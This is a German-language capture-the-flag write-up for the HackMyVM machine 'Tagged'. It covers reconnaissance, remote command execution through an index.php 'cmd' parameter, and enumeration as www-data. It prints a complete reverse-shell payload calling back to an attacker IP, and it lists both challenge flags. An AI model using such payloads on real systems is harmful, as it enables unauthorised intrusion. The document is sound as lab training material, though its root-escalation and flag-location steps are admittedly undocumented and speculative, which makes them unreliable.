# Tagged - HackMyVM (Medium)
 
![Tagged.png](Tagged.png)

## Übersicht

*   **VM:** Tagged
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Tagged)
*   **Schwierigkeit:** Medium
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 14. November 2022
*   **Original-Writeup:** https://alientec1908.github.io/Tagged_HackMyVM_Medium/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel der "Tagged"-Challenge war die Erlangung von User- und Root-Rechten. Der Weg begann mit der Enumeration eines Webservers (Port 80), der eine sehr kleine `index.php` bereitstellte. Ein Kommentar im HTML-Quellcode der Hauptseite enthielt einen Hinweis auf einen VHost (beginnend mit "xxx"). Ein weiterer, im Log nicht klar hergeleiteter Hinweis (`nice ports,/Trinity.txt.bak`) war entscheidend. Die Schwachstelle für den initialen Zugriff war eine Remote Command Execution (RCE) in `index.php` über den GET-Parameter `cmd`. Dies ermöglichte die Ausführung einer Reverse Shell als `www-data`. Nach der Stabilisierung der Shell und weiterer Enumeration (Benutzer `shyla`, `uma` identifiziert) wurde die User-Flag gefunden. Der genaue Weg zur Root-Privilegieneskalation und zum Auffinden der Root-Flag (möglicherweise `/Trinity.txt.bak`?) ist im bereitgestellten Log nicht dokumentiert.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `curl`
*   `nikto`
*   `nc` (netcat)
*   `wfuzz`
*   `python3`
*   `find`
*   `grep`
*   `ls`
*   `cat`
*   `printenv`
*   `ss`
*   `getcap`
*   `capsh`
*   `setcap`
*   `systemctl`
*   `stty`
*   `fg`
*   `reset`
*   Standard Linux-Befehle (`cd`, `id`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Tagged" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration:**
    *   IP-Findung mit `arp-scan` (`192.168.2.118`).
    *   `nmap`-Scan identifizierte offene Ports: 80 (HTTP - Nginx 1.18.0) und 7746 (unbekannter Dienst, der später nicht erreichbar war).
    *   `gobuster` auf Port 80 fand `index.html`, eine sehr kleine `index.php` (26 Bytes) und leere `report.html`/`report.php`.
    *   `curl http://192.168.2.118` offenbarte einen HTML-Kommentar mit dem Hinweis `` auf einen VHost.
    *   Ein weiterer, im Log nicht hergeleiteter Hinweis: `nice ports,/Trinity.txt.bak`.

2.  **Initial Access (RCE via Web):**
    *   *Die genaue Entdeckung der RCE-Schwachstelle in `index.php` ist im Log nicht dokumentiert.*
    *   Ausnutzung einer Remote Command Execution (RCE) Schwachstelle in `index.php` über den GET-Parameter `cmd`.
    *   Payload für eine Reverse Shell: `http://192.168.2.118/index.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F[Angreifer-IP]%2F9001%200%3E%261%27`.
    *   Erlangung einer interaktiven Shell als Benutzer `www-data` nach Stabilisierung.

3.  **Post-Exploitation / Enumeration als `www-data`:**
    *   Identifizierung der Benutzer `shyla` und `uma` durch Auflisten von `/home/`.
    *   Überprüfung der Berechtigungen von `/etc/passwd` und `/etc/shadow` (kein direkter Zugriff auf Shadow-Hashes).
    *   Untersuchung von SUID-Binaries, Umgebungsvariablen (`HOME=/var/www`), Capabilities und Systemd-Timern ergab keine direkten Eskalationspfade für `www-data`.
    *   Die User-Flag `g0disah4ck3r` wurde gefunden (Pfad nicht explizit im Log, aber als `www-data` oder später).

4.  **Privilege Escalation (zu `root`):**
    *   *Der detaillierte Weg zur Root-Privilegieneskalation und zum Auffinden der Root-Flag ist im bereitgestellten Log nicht dokumentiert.*
    *   Es wird vermutet, dass der Hinweis `/Trinity.txt.bak` eine Rolle spielte.

## Wichtige Schwachstellen und Konzepte

*   **Hinweise in HTML-Kommentaren:** Ein VHost-Hinweis wurde in einem HTML-Kommentar gefunden.
*   **Remote Command Execution (RCE) in PHP:** Die Datei `index.php` war anfällig für RCE über den `cmd`-Parameter, was den initialen Zugriff ermöglichte.
*   **Informationslecks (potenziell `/Trinity.txt.bak`):** Eine Backup-Datei könnte sensible Informationen enthalten haben (Spekulation, da nicht im Detail ausgeführt).
*   **Ungewöhnlicher Port (7746):** Ein nicht standardmäßiger Port wurde initial identifiziert, war aber später nicht erreichbar.

## Flags

*   **User Flag (`user.txt`):** `g0disah4ck3r`
*   **Root Flag (`root.txt` / evtl. `Trinity.txt.bak`):** `HMVrep0rtz!` (Weg zur Erlangung nicht im Log dokumentiert)

## Tags

`HackMyVM`, `Tagged`, `Medium`, `RCE`, `PHP`, `VHost Enumeration`, `Command Injection`, `Linux`, `Web`, `Privilege Escalation` (teilweise)
